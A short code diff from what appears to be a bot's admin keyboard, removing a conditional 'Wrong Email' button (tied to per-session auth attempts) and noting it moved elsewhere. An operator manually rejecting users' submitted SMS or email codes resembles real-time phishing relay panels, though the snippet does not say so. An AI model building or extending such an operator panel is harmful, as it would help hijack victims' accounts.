@@ -974,14 +974,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
   }
 
   // Wrong SMS button moved to main buttons section to be always available
-
-  if (session.authAttempts["email"] && session.authAttempts["email"] > 0) {
-    wrongButtonsRow2.push({
-      text: "🚫 EMAIL",
-      callback_data: `incorrect_email_${sessionId}`,
-    });
-    console.log("✅ Added Wrong Email button");
-  }
+  // Wrong Email Code button moved to main buttons section
 
   // Add wrong buttons rows if there are any
   if (wrongButtonsRow1.length > 0) {
